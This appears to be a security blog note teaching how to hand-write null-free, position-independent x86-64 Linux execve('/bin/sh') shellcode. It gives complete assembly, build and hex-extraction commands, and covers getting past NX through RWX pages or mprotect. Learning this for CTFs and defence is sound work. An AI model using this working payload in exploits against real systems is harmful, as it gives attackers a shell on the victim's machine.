---
number: 7
title: "x86-64 Shellcode Injection: Payloads That Actually Run"
slug: "x86-64-shellcode-injection"
date: "2025-05-03"
type: "note"
status: "DISCLOSED"
summary: "Hand-rolling position-independent shellcode for modern 64-bit Linux - the calling convention, the null-byte problem, and why your /bin/sh string keeps disappearing."
cves: []
severity: "TECHNIQUE"
timeline:
 - { label: "WRITTEN", date: "2025-05-03" }
 - { label: "PUBLISHED", date: "2025-05-03" }
---

Shellcode is the most honest code you'll ever write. No linker, no loader, no libc - just bytes that have to survive being copied into someone else's process and executed from wherever they land. When you can get executable memory, a compact `execve("/bin/sh")` is still the cleanest path to a shell. Here's how to write one that actually runs.

## The syscall ABI, memorized

On x86-64 Linux, `syscall` is the instruction and the convention is fixed:

| Register | Role |
|----------|------|
| `rax` | syscall number |
| `rdi` | 1st argument |
| `rsi` | 2nd argument |
| `rdx` | 3rd argument |
| `r10` | 4th argument |
| `rax` | return value |

`execve` is syscall **59**. To spawn a shell: `rax = 59`, `rdi = pointer to "/bin/sh"`, `rsi = 0`, `rdx = 0`, then `syscall`.

## The two hard problems

**Problem 1 - null bytes.** Shellcode is often delivered through string-based bugs (`strcpy`, `read` into a `char*` printed with `%s`). A `\x00` byte terminates the copy and truncates your payload. `mov rax, 59` assembles with leading zero bytes. So does `mov rdi, 0`. We must build these values without emitting nulls.

**Problem 2 - position independence.** You do not know the address your `/bin/sh` string will land at. The classic fix is to push the string onto the stack at runtime and point `rdi` at `rsp`.

## The payload

Here's the canonical `execve` shellcode, written to dodge both problems:

```nasm
section .text
global _start
_start:
    xor  rsi, rsi          ; rsi = 0  (argv = NULL) - xor avoids a null immediate
    push rsi               ; NULL terminator for our string on the stack
    mov  rdi, 0x68732f6e69622f ; "/bin/sh" packed little-endian, no null byte
    push rdi
    mov  rdi, rsp          ; rdi -> "/bin/sh" on the stack (position independent!)
    push rsi               ; envp = NULL
    mov  rdx, rsi          ; rdx = 0  (envp)
    xor  rax, rax
    mov  al, 59            ; rax = 59 via a 1-byte move - no null bytes
    syscall
```

Every trick here is load-bearing:

- **`xor rsi, rsi`** zeroes a register without a `mov reg, 0` (which would assemble null bytes).
- **`mov al, 59`** sets `rax` using only its lowest byte, after zeroing the full register. `mov rax, 59` would emit `\x00`s.
- **`"/bin/sh"` is exactly 7 bytes** - it packs into one register with a trailing null we supply ourselves.
- **`mov rdi, rsp`** makes the whole thing position independent.

## Assemble, extract, test

```bash
nasm -f elf64 sh.asm -o sh.o
ld sh.o -o sh
objcopy -O binary --only-section=.text sh sh.bin
xxd -p sh.bin    # your shellcode, ready to paste into an exploit
```

> Verify null-free before you trust it. A single \x00 where the delivery uses strcpy and your payload dies silently.

```python
sc = open("sh.bin","rb").read()
assert b"\x00" not in sc, "null byte in shellcode!"
```

Under time pressure in a CTF I reach for `pwntools`' `shellcraft`, which generates equivalent bytes. But hand-writing it once teaches you *why* each byte is there - exactly what you need when a target's filter strips spaces, or newlines, or forces uppercase.

## When you can't just run bytes

NX/DEP makes the stack non-executable, so pure injection is dead on modern defaults - that's what pushes you toward ROP. But shellcode is far from obsolete:

- **RWX pages** from `mmap`, JITs, or `mprotect`-happy programs give you an executable home again.
- **`mprotect` ROP stub → shellcode** is a common two-stage combo.
- **Constrained environments** (embedded, kernels, sandboxes) frequently lack desktop mitigations.

Knowing how to fold a payload by hand - null-free, position-independent, small - is a primitive you reach for constantly. It's the difference between borrowing an exploit and writing one.
